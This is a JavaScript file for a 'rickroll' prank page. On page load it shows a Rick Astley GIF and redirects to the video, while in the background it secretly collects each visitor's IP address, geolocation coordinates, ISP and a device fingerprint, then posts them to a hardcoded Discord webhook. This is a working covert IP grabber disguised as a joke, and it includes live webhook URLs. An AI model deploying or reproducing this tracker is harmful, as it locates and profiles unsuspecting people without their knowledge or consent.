function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const colorDepth = window.screen.colorDepth;
    const devicePixelRatio = window.devicePixelRatio;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const languages = navigator.languages;
    const cookiesEnabled = navigator.cookieEnabled;
    const doNotTrack = navigator.doNotTrack;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';

    let deviceType = 'Desktop';
    if (/Mobi|Android/i.test(userAgent)) deviceType = 'Mobile';
    if (/Tablet|iPad/i.test(userAgent)) deviceType = 'Tablet';

    let os = navigator.platform;
    let browser = 'Unknown Browser';
    const browserList = {
        'Chrome': 'Google Chrome',
        'Firefox': 'Mozilla Firefox',
        'Safari': 'Safari',
        'Edge': 'Microsoft Edge',
        'Opera': 'Opera',
        'OPR': 'Opera',
        'MSIE': 'Internet Explorer',
        'Trident': 'Internet Explorer'
    };

    for (const [key, value] of Object.entries(browserList)) {
        if (userAgent.includes(key)) {
            browser = value;
            break;
        }
    }

    return {
        deviceType,
        os,
        browser,
        screenWidth,
        screenHeight,
        colorDepth,
        devicePixelRatio,
        timezone,
        languages,
        cookiesEnabled,
        doNotTrack,
        hardwareConcurrency,
        deviceMemory
    };
}

function getPageInfo() {
    return {
        url: window.location.href,
        referrer: document.referrer || 'No referrer',
        pageTitle: document.title,
        timestamp: new Date().toISOString()
    };
}

function sendVisitorInfo() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;
            fetch(`https://ipwho.is/${userIP}`)
                .then(response => response.json())
                .then(ipData => {
                    const deviceInfo = getDeviceInfo();
                    const pageInfo = getPageInfo();

                    const message = `📡 **New Visitor Info** 📡\n\n` +
                        `🆔 **IP Address**: ${ipData.ip}\n` +
                        `🌍 **Location**: ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
                        `📍 **Coordinates**: Lat ${ipData.latitude}, Lon ${ipData.longitude}\n` +
                        `📡 **ISP**: ${ipData.isp} (AS${ipData.asn})\n` +
                        `🏠 **Org**: ${ipData.org}\n` +
                        `📱 **Device**: ${deviceInfo.deviceType}\n` +
                        `🖥 **OS**: ${deviceInfo.os}\n` +
                        `🌐 **Browser**: ${deviceInfo.browser}\n` +
                        `🖥 **Screen**: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.colorDepth}bit, ${deviceInfo.devicePixelRatio}x)\n` +
                        `⏰ **Timezone**: ${deviceInfo.timezone}\n` +
                        `🗣 **Languages**: ${deviceInfo.languages.join(', ')}\n` +
                        `🍪 **Cookies**: ${deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
                        `🚫 **DNT**: ${deviceInfo.doNotTrack || 'Not specified'}\n` +
                        `💻 **CPU Cores**: ${deviceInfo.hardwareConcurrency}\n` +
                        `🧠 **Device Memory**: ${deviceInfo.deviceMemory}GB\n` +
                        `🔗 **Page URL**: ${pageInfo.url}\n` +
                        `📌 **Referrer**: ${pageInfo.referrer}\n` +
                        `🕒 **Time**: ${pageInfo.timestamp}`;

                    fetch("https://discord.com/api/webhooks/1374747072141721661/fQ3Cs2brVlQYZLEtbeWgRywFoL2rRjlGxjkTR5KzbEk937AQr0U_1YuX3JPRQXq080Yn", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: message })
                    });
                })
                .catch(error => {
                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: "Error fetching IP details: " + error })
                    });
                });
        })
        .catch(error => {
            fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "Error fetching IP: " + error })
            });
        });
}

window.onload = function() {
    document.getElementById('rickrollGif').src = "https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif";
    sendVisitorInfo();
    setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }, 5000);
};
